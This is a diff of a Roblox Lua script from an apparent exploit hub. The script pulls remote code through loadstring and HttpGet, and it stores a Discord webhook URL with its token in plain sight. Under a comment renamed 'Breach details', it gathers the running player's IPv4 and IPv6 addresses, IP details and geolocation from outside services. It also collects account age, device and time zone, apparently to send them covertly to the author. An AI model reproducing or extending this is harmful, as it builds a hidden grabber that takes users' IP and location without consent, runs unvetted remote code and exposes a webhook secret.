@@ -1,96 +1,23 @@
 local webhookUrl = "https://discord.com/api/webhooks/1281779513088282666/XJpjnjA5Xo_TZOd8tXzW6Ui5p71AVCBqoD3W5kGSYklhyYgHWV9pbiF_2qjL0oV2hm-0"
-local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/main/Utilities.lua"))()
 
--- Services
+local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/main/Utilities.lua"))()
+local auth = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Authentication.lua"))()
 
 local player = game:GetService("Players").LocalPlayer
-local localizationService = game:GetService("LocalizationService")
 local httpService = game:GetService("HttpService")
+local localizationService = game:GetService("LocalizationService")
 local userInputService = game:GetService("UserInputService")
 
--- Storing Details
+-- Breach details
 
-local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 --local confidentialinformation = game:HttpGet("http://ip-api.com/json")
 local ipv4 = utils.getRawSiteData("https://api.ipify.org")
 local ipv6 = utils.getRawSiteData("https://api64.ipify.org")
 local ipdetails = utils.getRawSiteData("https://ipinfo.io/?token=03dce9579aa8e0")
 local geoloc = utils.getRawSiteData("http://www.geoplugin.net/json.gp?ip=" .. ipv4)
 
-local owner = false
 
-
--- Owner check
-
-
-
-
-
-
-
--- Fetch whitelist
-
-local function fetchWhitelist(url)
-    local success, response = pcall(function()
-        return game:HttpGet(url)
-    end)
-
-    if success then
-        local successDecode, whitelistData = pcall(function()
-            return httpService:JSONDecode(response)
-        end)
-
-        if successDecode then
-            return whitelistData
-        else
-            player:Kick("Failed to decode JSON. Response may be malformed.")
-        end
-    else
-        player:Kick("Failed to fetch whitelist. Error: " .. tostring(response))
-    end
-    return nil
-end
-
--- Fetch whitelist URL
-
-local whitelistURL = "https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Users.json"
-local whitelistedUsers = fetchWhitelist(whitelistURL)
-
-if not whitelistedUsers then
-    player:Kick("Whitelist retrieval failed. Check your URL and JSON formatting.")
-    return
-end
-
--- Owner check
-
-local function isOwner(hwid, whitelist)
-    for _, user in ipairs(whitelist) do
-        if user.HWID == hwid and user.Rank == "Owner" then
-            return true, user
-        end
-    end
-    return false, nil
-end
-
-local owner = isOwner(hwid, whitelistedUsers) -- Set owner
-
-
-
-
-
-
-
--- Alt detection
-
-
-if player.AccountAge >= 30 then
-    altAccount = false
-else
-    altAccount = true
-end
-
-
--- Determining account age
+-- Account age
 
 
 local function determineAccountAge(accountAgeInDays)
@@ -123,7 +50,7 @@ local function determineAccountAge(accountAgeInDays)
 end
 
 
--- Fetching device
+-- Device
 
 
 local function getDevice()
@@ -139,7 +66,9 @@ local function getDevice()
 end
 
 
--- Fetching country
+--[[
+
+-- Country
 
 
 local countryNames = {
@@ -185,6 +114,8 @@ local function getCountry()
     
     return shortCountry, fullCountry
 end
+
+]]
 
 
 -- Fetching time zone
